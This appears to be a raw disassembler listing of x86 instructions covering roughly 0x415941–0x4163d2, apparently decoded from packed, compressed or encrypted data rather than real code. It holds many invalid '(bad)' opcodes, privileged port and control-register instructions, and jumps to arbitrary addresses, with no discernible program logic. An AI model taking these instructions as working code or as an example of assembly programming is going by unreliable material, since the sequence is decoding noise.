  415941:	mov    DWORD PTR [ebp+0x28e2af9],edi
  415947:	mov    bl,0x84
  415949:	test   al,0xf4
  41594b:	sub    esp,DWORD PTR [ecx]
  41594d:	or     al,0x62
  41594f:	dec    esi
  415950:	cmp    BYTE PTR [eax-0x36],0xe1
  415954:	ds (bad) 
  415957:	mov    cl,0x71
  415959:	mov    eax,ds:0xb448bf8c
  41595e:	cmp    eax,0xacbdad81
  415963:	mov    cl,0xe
  415965:	sbb    al,0x7e
  415967:	jl     0x415971
  415969:	stc    
  41596a:	adc    al,0x64
  41596c:	outs   dx,DWORD PTR ds:[esi]
  41596d:	stos   BYTE PTR es:[edi],al
  41596e:	aaa    
  41596f:	cwde   
  415970:	mov    esp,0xfde62711
  415975:	out    0xe8,al
  415977:	sub    DWORD PTR [ebx+0x2c],0x1d
  41597b:	xchg   eax,ecx
  41597d:	in     eax,0xd3
  41597f:	xchg   esi,eax
  415980:	mov    ah,BYTE PTR [ebx]
  415982:	xabort 0x99
  415985:	std    
  415986:	in     eax,0xeb
  415988:	shl    ecx,1
  41598a:	iret   
  41598b:	loop   0x415997
  41598d:	lods   eax,DWORD PTR ds:[esi]
  41598e:	fadd   st(7),st
  415990:	dec    ebx
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	in     al,dx
  415a01:	jl     0x4159ea
  415a03:	xor    eax,0xe436
  415a08:	add    eax,0x3c000001
  415a0d:	sub    al,0xb6
  415a0f:	add    dh,dl
  415a11:	adc    DWORD PTR ds:0x50a30756,ebp
  415a17:	(bad)  
  415a18:	into   
  415a19:	mov    ebx,0x814d0360
  415a1e:	mov    ch,0x3a
  415a20:	xchg   edx,eax
  415a21:	cmp    ch,BYTE PTR [edi-0x20a1fdf3]
  415a27:	or     eax,0xde5759fb
  415a2c:	mov    ah,0x6b
  415a2e:	xchg   esi,eax
  415a2f:	mov    dh,0x63
  415a31:	mov    esi,0xb3fb7fa4
  415a36:	xor    ch,BYTE PTR [ebp-0x241d046e]
  415a3c:	inc    ebx
  415a3d:	pop    ebp
  415a3e:	mov    edx,0xabaeb1dc
  415a43:	and    ch,BYTE PTR [edi-0x710c3b1b]
  415a49:	push   edi
  415a4a:	xor    eax,0x5ec55e81
  415a4f:	adc    ebp,DWORD PTR [edx+0x8133719]
  415a55:	sub    al,0xf6
  415a57:	out    dx,eax
  415a58:	xchg   edx,eax
  415a59:	pop    edx
  415a5a:	inc    esi
  415a5b:	sub    al,0xd7
  415a5d:	sar    bh,cl
  415a5f:	scas   eax,DWORD PTR es:[edi]
  415a60:	enter  0x969,0x53
  415a64:	cmc    
  415a65:	std    
  415a66:	jae    0x415abe
  415a68:	xlat   BYTE PTR ds:[ebx]
  415a69:	adc    BYTE PTR [ecx+eax*8],dh
  415a6c:	jns    0x415abe
  415a6e:	mov    esi,0xc8b07b1
  415a73:	aam    0x7
  415a75:	inc    ecx
  415a76:	cmp    BYTE PTR [edi+0x6f],dl
  415a79:	jo     0x415a10
  415a7b:	int3   
  415a7c:	idiv   DWORD PTR [edx]
  415a7e:	xor    esi,edi
  415a80:	cmp    ah,cl
  415a82:	push   0x28e713eb
  415a87:	lds    ecx,FWORD PTR [esi+0x9]
  415a8a:	mov    bl,0x6f
  415a8c:	jle    0x415a58
  415a8e:	mov    DWORD PTR [ebp+0x4c],eax
  415a91:	popf   
  415a92:	fwait
  415a93:	out    0xa8,al
  415a95:	add    bh,bh
  415a97:	mov    bl,0xbc
  415a99:	mov    BYTE PTR ds:0xc8bd0a68,al
  415a9f:	sub    al,0xaf
  415aa1:	inc    esp
  415aa2:	shl    DWORD PTR [eax-0x29fa3e5c],1
  415aa8:	pop    ebp
  415aa9:	jmp    0x415afc
  415aab:	sub    esp,DWORD PTR [edi-0x4d]
  415aae:	stos   BYTE PTR es:[edi],al
  415aaf:	clc    
  415ab0:	popa   
  415ab1:	imul   BYTE PTR [ebp+0x1d3075a9]
  415ab7:	dec    edi
  415ab8:	fldcw  WORD PTR [eax]
  415aba:	or     edi,0xffffff99
  415abd:	(bad)
  415ac0:	add    eax,0x4aca5ad2
  415ac5:	sub    cl,cl
  415ac7:	ror    BYTE PTR [ebx+0x53],cl
  415aca:	test   ecx,0xc2e0b21e
  415ad0:	sub    ch,0x84
  415ad3:	mov    edx,0x61c28d1d
  415ad8:	or     DWORD PTR [edx+0x5ac7446a],esp
  415ade:	xchg   ebx,eax
  415adf:	add    eax,0x5e55380
  415ae4:	xor    BYTE PTR [edx+eax*1+0x73],cl
  415ae8:	push   es
  415ae9:	xchg   BYTE PTR [eax+0x4abb734d],ch
  415aef:	dec    ebp
  415af0:	cmp    esi,DWORD PTR [edx]
  415af2:	pop    edi
  415af3:	push   0x50
  415af5:	imul   edi,esp,0xffffffc9
  415af8:	arpl   WORD PTR [ebx],dx
  415afa:	ja     0x415b64
  415afc:	adc    al,0x29
  415afe:	mov    edx,0xf2237a66
  415b03:	pop    ecx
  415b04:	icebp  
  415b05:	int3   
  415b06:	das    
  415b07:	push   0xffffffc0
  415b09:	inc    eax
  415b0a:	es xchg esi,eax
  415b0c:	stc    
  415b0d:	stos   DWORD PTR es:[edi],eax
  415b0e:	jno    0x415b8c
  415b10:	dec    ecx
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fsub   QWORD PTR [esi+eiz*2-0x69]
  415b83:	loope  0x415bc0
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0xbe000001,al
  415b8d:	popf   
  415b8e:	ins    BYTE PTR es:[edi],dx
  415b8f:	add    eax,0xb5f4a190
  415b94:	out    0xbc,eax
  415b96:	fucomip st,st(1)
  415b98:	nop
  415b99:	jbe    0x415c18
  415b9b:	add    al,0x77
  415b9d:	dec    esp
  415b9e:	jae    0x415b5c
  415ba0:	xor    DWORD PTR [ebx+0x64495c1f],ebx
  415ba6:	inc    esi
  415ba7:	xor    DWORD PTR [eax],esi
  415ba9:	dec    esi
  415baa:	dec    esp
  415bab:	mov    eax,0xef3d46fa
  415bb0:	jmp    0xf8d3071c
  415bb5:	cmp    eax,0xf6f680d1
  415bba:	fisubr WORD PTR [eax-0x5e1b3f8]
  415bc0:	loope  0x415b6b
  415bc2:	in     eax,0x6a
  415bc4:	fmul   st,st(6)
  415bc6:	out    0xe5,eax
  415bc8:	in     eax,dx
  415bc9:	sbb    al,0x33
  415bcb:	pop    edi
  415bcc:	cmp    ch,BYTE PTR [ecx-0x77]
  415bcf:	jbe    0x415bfb
  415bd1:	cmp    ah,ah
  415bd3:	pop    ds
  415bd4:	adc    eax,0x94be0f53
  415bd9:	xchg   esi,eax
  415bda:	jo     0x415b78
  415bdc:	mov    fs:0x726ab71a,al
  415be2:	sub    ch,BYTE PTR [ecx]
  415be4:	xor    bh,BYTE PTR [esi-0x31]
  415be7:	loopne 0x415b86
  415be9:	or     eax,0xaaaeb1ab
  415bee:	cmp    esi,esi
  415bf0:	mov    al,dl
  415bf2:	sub    al,0x7f
  415bf4:	shr    DWORD PTR ds:0xf0f2e229,cl
  415bfa:	cmp    BYTE PTR [esi-0x3d104d88],al
  415c00:	bound  esp,QWORD PTR [ebx+0xa]
  415c03:	xor    bh,BYTE PTR [ebp-0x4184678c]
  415c09:	sbb    eax,DWORD PTR [edx-0x54838562]
  415c0f:	iret   
  415c10:	fs int 0xcb
  415c13:	xor    al,0x89
  415c15:	xlat   BYTE PTR ds:[ebx]
  415c16:	js     0x415c25
  415c18:	pop    ecx
  415c19:	jnp    0x415be6
  415c1b:	xor    eax,0x3e28d1e0
  415c20:	mov    WORD PTR [ebx+eiz*8-0x78],fs
  415c24:	or     eax,0x1eae0dc6
  415c29:	aam    0x70
  415c2b:	repz ds clc 
  415c2e:	enter  0xabb0,0x24
  415c32:	xchg   ebp,eax
  415c33:	jg     0x415c58
  415c35:	test   eax,0xa815ddd8
  415c3a:	sub    DWORD PTR [ebx],esi
  415c3c:	dec    edi
  415c3d:	ja     0x415c0f
  415c3f:	xor    al,cl
  415c41:	mov    cl,BYTE PTR [ecx]
  415c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c44:	ret    
  415c45:	jmp    0xb7359a5c
  415c4a:	addr16 (bad) 
  415c4c:	adc    al,0xf9
  415c4e:	cld    
  415c4f:	dec    esi
  415c50:	lahf   
  415c51:	mov    al,0xe3
  415c53:	cmc    
  415c54:	inc    ebx
  415c55:	pushf  
  415c56:	push   edx
  415c57:	push   eax
  415c58:	cmp    DWORD PTR [ebx],esp
  415c5a:	push   ss
  415c5b:	jecxz  0x415c9e
  415c5d:	cs mov eax,ebx
  415c60:	pop    edx
  415c61:	shl    BYTE PTR [ecx+0x3d1e41b7],1
  415c67:	mov    esi,0xf56f2dcc
  415c6c:	lds    edi,FWORD PTR [ebp+ecx*4+0x8]
  415c70:	sub    dh,ch
  415c72:	popf   
  415c73:	les    ecx,FWORD PTR [esi]
  415c75:	mov    DWORD PTR [ecx],edx
  415c77:	pop    es
  415c78:	adc    edi,DWORD PTR [edi+0xb174b86]
  415c7e:	cmp    edx,edx
  415c80:	les    ecx,FWORD PTR [ebx-0x6e]
  415c83:	add    ebx,DWORD PTR [esi+0x3e]
  415c86:	lods   eax,DWORD PTR ds:[esi]
  415c87:	fimul  WORD PTR [edx+0x3cf17fca]
  415c8d:	inc    eax
  415c8e:	in     eax,dx
  415c8f:	loope  0x415cf3
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x3a521b1f
  415d03:	or     al,BYTE PTR [eax-0x1a]
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    eax,0xca000001
  415d0d:	mov    al,0x1e
  415d0f:	push   ds
  415d10:	jecxz  0x415c9e
  415d12:	test   DWORD PTR [esi-0x6a],0x7dd59d3
  415d19:	out    dx,al
  415d1a:	mov    WORD PTR [esi+ebp*8+0xc],ss
  415d1e:	arpl   bp,di
  415d20:	pop    es
  415d21:	mov    edx,DWORD PTR [edi+0x27]
  415d24:	and    al,BYTE PTR [edx]
  415d26:	push   ecx
  415d27:	adc    ecx,0xef916ebf
  415d2d:	ror    BYTE PTR [eax],cl
  415d2f:	jp     0x415d1a
  415d31:	repnz dec edx
  415d33:	jmp    FWORD PTR [eax-0x1c788fab]
  415d39:	stos   BYTE PTR es:[edi],al
  415d3a:	add    ebx,DWORD PTR [ebx]
  415d3c:	repz push cs
  415d3e:	sub    al,0xae
  415d40:	pop    es
  415d41:	ret    0xa0bc
  415d44:	arpl   dx,bp
  415d46:	loope  0x415db3
  415d48:	sub    esi,esi
  415d4a:	stc    
  415d4b:	cmp    eax,0x5418ed9
  415d50:	loopne 0x415d14
  415d52:	dec    esi
  415d53:	cmp    al,0xa5
  415d55:	jmp    0x415d33
  415d57:	shl    ecx,0x9f
  415d5a:	push   es
  415d5b:	mov    dl,0x7a
  415d5d:	xor    al,0x3f
  415d5f:	and    DWORD PTR [edi],eax
  415d61:	neg    BYTE PTR [ebp+0x15ccd8c3]
  415d67:	add    eax,0x428b1dbd
  415d6c:	shl    DWORD PTR [ebp+edi*4+0x62],0xe4
  415d71:	fwait
  415d72:	(bad)  
  415d73:	mov    gs,ecx
  415d75:	fisubr WORD PTR [ebx]
  415d77:	out    0x5f,eax
  415d79:	sbb    ecx,DWORD PTR [ebp+0x733bc9f1]
  415d7f:	and    DWORD PTR ds:0x3eeff685,eax
  415d85:	in     al,0xb
  415d87:	inc    DWORD PTR [ecx-0xb]
  415d8a:	sub    ecx,DWORD PTR [esi-0x24e61ec5]
  415d90:	mov    ds:0x72c8f70e,al
  415d95:	jmp    0x3719d1ed
  415d9a:	out    0xe9,eax
  415d9c:	mov    ebx,0xa84916bf
  415da1:	push   eax
  415da2:	mov    esp,0x827cb7c4
  415da7:	adc    bl,ah
  415da9:	xchg   ebp,eax
  415daa:	enter  0x91b4,0x97
  415dae:	mov    eax,0x4a26856d
  415db3:	adc    eax,0xd229f5d0
  415db8:	or     DWORD PTR [ebx+ecx*2-0x19],esp
  415dbc:	in     eax,dx
  415dbd:	inc    esi
  415dbe:	imul   esi,edx,0x58
  415dc1:	cmp    DWORD PTR [edi+eiz*2],edx
  415dc4:	sbb    esi,edi
  415dc6:	inc    ebx
  415dc7:	jl     0x415d61
  415dc9:	fdivr  DWORD PTR ds:0x7c113187
  415dcf:	xchg   edx,eax
  415dd0:	ja     0x415e26
  415dd2:	call   0x3c10cd88
  415dd7:	rcl    dh,0x71
  415dda:	xchg   edx,eax
  415ddb:	jns    0x415e53
  415ddd:	dec    edx
  415dde:	sbb    esi,DWORD PTR [eax+0x76]
  415de1:	cli    
  415de2:	je     0x415db8
  415de4:	mov    cl,0xa4
  415de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415de7:	pop    ebx
  415de8:	jbe    0x415dee
  415dea:	cmp    al,0x6e
  415dec:	mov    cr5,edx
  415def:	push   edi
  415df0:	mov    ah,0x93
  415df2:	test   eax,0xd8c1f2cc
  415df7:	mov    dh,0xe
  415df9:	inc    ecx
  415dfa:	es pop es
  415dfc:	dec    ebp
  415dfd:	sub    DWORD PTR [ebx-0xe775b91],edi
  415e03:	inc    ebp
  415e04:	mov    eax,0x9d5f12ed
  415e09:	into   
  415e0a:	(bad)
  415e0f:	jp     0x415e51
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x40]
  415e81:	bound  esp,QWORD PTR [esi-0x32]
  415e84:	inc    ebp
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0x99000001,al
  415e8d:	cmp    ecx,DWORD PTR ds:0xd3cc26b
  415e93:	xor    BYTE PTR [ecx-0x53],ah
  415e96:	pushf  
  415e97:	cs push esp
  415e99:	(bad)  
  415e9a:	push   ss
  415e9b:	sbb    ah,al
  415e9d:	cs and eax,0x9253539d
  415ea3:	(bad)  
  415ea4:	push   0x4d
  415ea6:	fs enter 0x906d,0x25
  415eab:	or     ebx,DWORD PTR ds:0xa9465f08
  415eb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eb2:	fist   WORD PTR [bp+si+0x678c]
  415eb7:	cdq    
  415eb8:	push   esi
  415eb9:	hlt    
  415eba:	xchg   esp,eax
  415ebb:	hlt    
  415ebc:	add    eax,0x92c5f261
  415ec1:	aaa    
  415ec2:	repnz in eax,dx
  415ec4:	jmp    0x415eaa
  415ec6:	dec    edi
  415ec7:	(bad)  
  415ec9:	int3   
  415eca:	mov    ds,esi
  415ecc:	adc    DWORD PTR [eax],edx
  415ece:	shr    DWORD PTR [ebp*8+0x7a460acd],cl
  415ed5:	jae    0x415f42
  415ed7:	cs mov cs:0x54a200d0,eax
  415ede:	mov    bl,0x51
  415ee0:	adc    al,0x1e
  415ee2:	sar    DWORD PTR [ebp+0x7a27f83c],cl
  415ee8:	sub    dh,bh
  415eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eeb:	rol    DWORD PTR [ecx-0x41],cl
  415eee:	sub    DWORD PTR [ebx+ecx*8],ebp
  415ef1:	leave  
  415ef2:	clc    
  415ef3:	xor    eax,0xb6bd2944
  415ef8:	shl    eax,1
  415efa:	lods   eax,DWORD PTR ds:[esi]
  415efb:	sub    bl,BYTE PTR [eax+0x30d12299]
  415f01:	sub    DWORD PTR [edx],esp
  415f03:	loop   0x415eaf
  415f05:	sar    DWORD PTR [esi],0x9f
  415f08:	mov    eax,0xb00b183c
  415f0d:	out    0x26,eax
  415f0f:	push   ss
  415f10:	test   al,0xde
  415f12:	imul   edi,ecx,0xffffffbd
  415f15:	sub    esi,DWORD PTR [eax]
  415f17:	mov    DWORD PTR [ebp+0x453da39],esi
  415f1d:	fwait
  415f1e:	out    dx,eax
  415f1f:	adc    al,0x43
  415f21:	test   BYTE PTR [eax],cl
  415f23:	xchg   DWORD PTR [edx-0x68f170a5],edx
  415f29:	cwde   
  415f2a:	or     al,0xd4
  415f2c:	push   ecx
  415f2d:	xor    DWORD PTR [eax+0x151706a5],eax
  415f33:	xchg   edx,eax
  415f34:	push   0x6c3071ba
  415f39:	push   ebx
  415f3a:	push   edi
  415f3b:	push   0xa9519282
  415f40:	scas   al,BYTE PTR es:[edi]
  415f41:	mov    esp,0x4373f597
  415f46:	mov    ch,0xa6
  415f48:	rol    DWORD PTR [edx+0x78824001],cl
  415f4e:	mov    bh,0xaf
  415f50:	mov    ebx,0x49c611db
  415f55:	mov    ch,0xb0
  415f57:	cli    
  415f58:	aad    0x41
  415f5a:	mov    bh,0xf6
  415f5c:	add    eax,0x53f76b8d
  415f61:	jle    0x415f34
  415f63:	jns    0x415fbb
  415f65:	aaa    
  415f66:	pushf  
  415f67:	jno    0x415ef0
  415f69:	aad    0x3c
  415f6b:	pop    cx
  415f6d:	sti    
  415f6e:	and    ah,BYTE PTR [ebx]
  415f70:	xor    eax,esi
  415f72:	pop    ebx
  415f73:	mov    al,al
  415f75:	jae    0x415f6c
  415f77:	shl    BYTE PTR [eiz*2+0xeff507c],0x59
  415f7f:	ja     0x415f92
  415f81:	sbb    eax,0xdbefcb0f
  415f86:	dec    edx
  415f87:	sub    al,BYTE PTR [edi]
  415f89:	aad    0x75
  415f8b:	adc    DWORD PTR [ecx-0x78],esp
  415f8e:	adc    ah,BYTE PTR [edi-0x55]
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	fbld   TBYTE PTR [ebp-0x17b5da1f]
  416006:	add    BYTE PTR [eax],al
  416008:	add    eax,0x1d000001
  41600d:	enter  0xc5f0,0x30
  416011:	test   eax,0xfe5289ea
  416016:	push   ebx
  416017:	xchg   edi,eax
  416018:	push   es
  416019:	jmp    0x17d9:0xa33471cd
  416020:	xor    bl,BYTE PTR ds:0x5f0c2a34
  416026:	push   ebp
  416027:	arpl   WORD PTR [eax-0x7a9b1f3d],di
  41602d:	pop    esp
  41602e:	mul    DWORD PTR [ecx]
  416030:	add    DWORD PTR [edx],ebx
  416032:	push   0x584cccec
  416037:	xchg   edi,eax
  416038:	out    dx,eax
  416039:	dec    ebp
  41603a:	dec    cl
  41603c:	popf   
  41603d:	les    esi,FWORD PTR [esi+0x299bc09]
  416043:	stos   BYTE PTR es:[edi],al
  416044:	push   edi
  416045:	lods   eax,DWORD PTR ds:[esi]
  416046:	jno    0x416063
  416048:	xlat   BYTE PTR ds:[ebx]
  416049:	dec    esi
  41604a:	les    edi,FWORD PTR [esi+0x55]
  41604d:	dec    ebx
  41604e:	inc    ebx
  41604f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416050:	fucomi st,st(4)
  416052:	mov    eax,ds:0x9aed02ab
  416057:	push   ebx
  416058:	add    ebp,esp
  41605a:	in     al,dx
  41605b:	push   cs
  41605c:	lock and bl,BYTE PTR [ecx-0x9]
  416060:	test   eax,0x479b7e87
  416065:	cwde   
  416066:	shr    DWORD PTR [esi-0x7],1
  416069:	mov    ch,0xc6
  41606b:	idiv   DWORD PTR [edx]
  41606d:	(bad)  
  41606e:	lahf   
  41606f:	int    0x1f
  416071:	xchg   esp,eax
  416072:	and    dh,BYTE PTR [esi-0x5ecbbeba]
  416078:	sub    al,0x8b
  41607a:	adc    ebp,DWORD PTR [ebp+0x51cee2bb]
  416080:	sbb    eax,0x42681f2f
  416085:	cs xchg edi,eax
  416087:	or     BYTE PTR ds:0x4d3d1167,al
  41608d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41608e:	jg     0x4160d8
  416090:	pop    ss
  416091:	push   ebp
  416092:	daa    
  416093:	mov    bl,0x47
  416095:	jle    0x416077
  416097:	fist   DWORD PTR [edx+0x36]
  41609a:	ror    BYTE PTR [eax-0xbf102f7],1
  4160a0:	adc    BYTE PTR [ebx],ch
  4160a2:	jno    0x4160ca
  4160a4:	loop   0x416116
  4160a6:	fimul  DWORD PTR [edi+0x6ae5b711]
  4160ac:	sub    al,0x50
  4160ae:	outs   dx,BYTE PTR ds:[esi]
  4160af:	(bad)
  4160b3:	push   edi
  4160b4:	inc    edx
  4160b5:	mov    ds:0xfe874658,al
  4160ba:	add    DWORD PTR ds:0x44b02abd,esi
  4160c0:	gs popf 
  4160c2:	mov    dh,0x65
  4160c4:	cdq    
  4160c5:	popa   
  4160c6:	aad    0xe
  4160c8:	gs in  al,0x2
  4160cb:	(bad)  
  4160cc:	(bad)  
  4160cd:	jle    0x4160ca
  4160cf:	inc    ecx
  4160d0:	cdq    
  4160d1:	dec    ebx
  4160d2:	ins    BYTE PTR es:[edi],dx
  4160d3:	div    edx
  4160d5:	and    DWORD PTR [ebx+0x2d],eax
  4160d8:	inc    eax
  4160d9:	push   es
  4160da:	or     BYTE PTR [edi-0x4f7bc1c6],bh
  4160e0:	sbb    esi,DWORD PTR [ecx]
  4160e2:	mov    eax,0xaa2cde24
  4160e7:	ds dec edx
  4160e9:	xor    DWORD PTR [eax],0x8a3dd4a
  4160ef:	sbb    ch,bh
  4160f1:	sbb    al,0xf
  4160f3:	cwde   
  4160f4:	fdivr  st,st(2)
  4160f6:	test   al,0xaf
  4160f8:	ret    0xc530
  4160fb:	icebp  
  4160fc:	ins    BYTE PTR es:[edi],dx
  4160fd:	mov    al,0x49
  4160ff:	jp     0x4160ca
  416101:	psraw  mm2,QWORD PTR [ebx+0x53aa4103]
  416108:	ss inc ebp
  41610a:	shr    DWORD PTR [ebx+0x6d],cl
  41610d:	popa   
  41610e:	in     al,dx
  41610f:	mov    eax,0x51
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0xadcb4df3
  416183:	mov    eax,ds:0xe94f
  416188:	add    eax,0x1000001
  41618d:	test   eax,0x812db964
  416192:	ins    DWORD PTR es:[edi],dx
  416193:	cmp    DWORD PTR [ebx],edx
  416195:	ins    DWORD PTR es:[edi],dx
  416196:	mov    ebx,0x5463335b
  41619b:	or     edi,DWORD PTR [ebx+0x2cae16cf]
  4161a1:	jno    0x4161e6
  4161a3:	or     BYTE PTR [ecx],al
  4161a5:	(bad)  
  4161a6:	dec    ebp
  4161a7:	out    dx,eax
  4161a8:	cld    
  4161a9:	fist   WORD PTR [ecx-0x1e9670b7]
  4161af:	idiv   DWORD PTR [edi]
  4161b1:	pusha  
  4161b2:	shl    BYTE PTR [edx+edi*1-0x71],0xd1
  4161b7:	lods   al,BYTE PTR ds:[esi]
  4161b8:	mov    edi,DWORD PTR [edi]
  4161ba:	pushf  
  4161bb:	pop    ebx
  4161bc:	xor    DWORD PTR [edi+eiz*8],edx
  4161bf:	adc    DWORD PTR [ecx+0x18],ebp
  4161c2:	jle    0x416163
  4161c4:	fnsave [ebx+0x72c8a80d]
  4161ca:	dec    esp
  4161cb:	shr    DWORD PTR [edi-0x60b69c1d],0x37
  4161d2:	sbb    BYTE PTR [eax+0x16],ah
  4161d5:	push   ecx
  4161d6:	dec    eax
  4161d7:	pop    ebx
  4161d8:	cmp    eax,0xcdc1255a
  4161dd:	aaa    
  4161de:	fiadd  WORD PTR [esi]
  4161e0:	adc    al,BYTE PTR [esi-0x3343fe32]
  4161e6:	push   ecx
  4161e7:	scas   eax,DWORD PTR es:[edi]
  4161e8:	enter  0xd8d4,0x1
  4161ec:	add    dl,BYTE PTR ds:0xa3014af3
  4161f2:	push   esi
  4161f3:	sub    eax,0x94218d85
  4161f8:	jmp    0xe2389cfa
  4161fd:	and    eax,0xdc73aa4e
  416202:	sbb    eax,0x67891d99
  416207:	daa    
  416208:	cld    
  416209:	or     al,0xa7
  41620b:	and    eax,0x92c90118
  416210:	in     eax,0x2a
  416212:	cmp    BYTE PTR [edx+0x57],0xca
  416216:	fild   WORD PTR [eax+0x4e]
  416219:	clc    
  41621a:	daa    
  41621b:	xchg   DWORD PTR [ebx-0x49],ebp
  41621e:	fbstp  TBYTE PTR [eax]
  416220:	test   al,0xe0
  416222:	test   DWORD PTR [edx-0x7],0x3fd8a0b2
  416229:	and    BYTE PTR [ecx+0x2faba500],ah
  41622f:	popa   
  416230:	test   eax,0xbbd37d6b
  416235:	add    al,0x2d
  416237:	push   esi
  416238:	xchg   esi,eax
  416239:	lods   al,BYTE PTR ds:[esi]
  41623a:	popf   
  41623b:	push   ss
  41623c:	not    DWORD PTR [ebp-0x5f4ee745]
  416242:	mov    al,0x4
  416244:	inc    esp
  416245:	call   0x93f2b20
  41624a:	or     al,0x3e
  41624c:	xchg   ebp,eax
  41624d:	in     al,dx
  41624e:	leave  
  41624f:	pusha  
  416250:	lods   al,BYTE PTR ds:[esi]
  416251:	jge    0x4162a6
  416253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416254:	aam    0x1b
  416256:	fisttp QWORD PTR [edi+ebp*4-0x3636a61a]
  41625d:	ret    0x991f
  416260:	nop
  416261:	inc    esi
  416262:	call   0x86d1:0x4946d0c0
  416269:	push   ss
  41626a:	push   ss
  41626b:	aaa    
  41626c:	mov    ah,0xb7
  41626e:	push   edx
  41626f:	ss dec esp
  416271:	or     dh,cl
  416273:	jg     0x416299
  416275:	arpl   WORD PTR [esi+0x43],sp
  416278:	outs   dx,BYTE PTR ds:[esi]
  416279:	or     eax,DWORD PTR [esi-0x47ebc311]
  41627f:	std    
  416280:	mov    dl,0x49
  416282:	xlat   BYTE PTR ds:[ebx]
  416283:	adc    ecx,DWORD PTR [ebp+0x2153d483]
  416289:	mov    eax,ds:0x1e6104aa
  41628e:	ins    DWORD PTR es:[edi],dx
  41628f:	xchg   ebp,eax
  416290:	dec    ecx
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x5491:0x451a0cee
  416305:	jmp    0x0:0x1050000
  41630c:	cmp    dh,dh
  41630e:	lock jge 0x4162d3
  416311:	outs   dx,BYTE PTR ds:[esi]
  416312:	or     eax,0xf24e2852
  416317:	sub    DWORD PTR [ecx],ecx
  416319:	popa   
  41631a:	rcl    DWORD PTR [esi+0x76aa1c83],cl
  416320:	xor    DWORD PTR [edi],ebx
  416322:	sbb    DWORD PTR [ecx-0x6],0x4b53ce0e
  416329:	or     dl,BYTE PTR [esi]
  41632b:	loope  0x416350
  41632d:	rol    BYTE PTR ds:0x1334f7d8,1
  416333:	sbb    ch,BYTE PTR [eiz*1+0x4c2865db]
  41633a:	jo     0x4163aa
  41633c:	sbb    al,0xbd
  41633e:	xchg   ebp,eax
  41633f:	mov    edx,eax
  416341:	outs   dx,BYTE PTR ds:[esi]
  416342:	ins    DWORD PTR es:[edi],dx
  416343:	mov    ds:0x1181eaa,eax
  416348:	sub    ecx,DWORD PTR [edi-0x6d]
  41634b:	fbstp  TBYTE PTR [ecx]
  41634d:	fistp  WORD PTR [ebp+0x3536874a]
  416353:	mov    bh,0xa0
  416355:	push   esi
  416356:	xchg   BYTE PTR cs:[ebp+0x32],dl
  41635a:	stc    
  41635b:	mov    ah,0x4f
  41635d:	jo     0x41638b
  41635f:	rcr    BYTE PTR [edx-0x4d],1
  416362:	mov    edx,0xb9cfa96a
  416367:	sti    
  416368:	nop
  416369:	ja     0x4163e5
  41636b:	mov    ds:0x86234464,al
  416370:	jo     0x4163bd
  416372:	sub    eax,0xdf1292a1
  416377:	add    al,ch
  416379:	arpl   WORD PTR [esi+0x720f5721],cx
  41637f:	fisubr WORD PTR [esi]
  416381:	fcomp  QWORD PTR [eax-0x5382aeb6]
  416387:	or     eax,0x3af984c
  41638c:	push   ss
  41638d:	xchg   edx,eax
  41638e:	mov    bh,0xa
  416390:	lods   eax,DWORD PTR ds:[esi]
  416391:	cmc    
  416392:	es jecxz 0x4163a8
  416395:	xor    BYTE PTR [eax],dl
  416397:	pop    eax
  416398:	ror    DWORD PTR [ebx],cl
  41639a:	mov    esp,eax
  41639c:	popf   
  41639d:	ret    0xf954
  4163a0:	fist   WORD PTR ds:0xf960d3c3
  4163a6:	jl     0x416383
  4163a8:	sahf   
  4163a9:	clc    
  4163aa:	lods   al,BYTE PTR ds:[esi]
  4163ab:	push   eax
  4163ac:	dec    ebp
  4163ad:	mov    DWORD PTR [eax-0x2a],ebx
  4163b0:	xor    esp,edx
  4163b2:	(bad)  
  4163b3:	addr16 mov ebp,0xe8a8b46d
  4163b9:	mov    ecx,0x352193ef
  4163be:	mov    edi,0x83bad53c
  4163c3:	push   ebp
  4163c4:	add    BYTE PTR [ebx],cl
  4163c6:	fldcw  WORD PTR [ebp+0x3c]
  4163c9:	cmp    edi,DWORD PTR [edi]
  4163cb:	push   ss
  4163cc:	rol    BYTE PTR [esi+0x7fd7455f],cl
  4163d2:	adc    al,0xbb
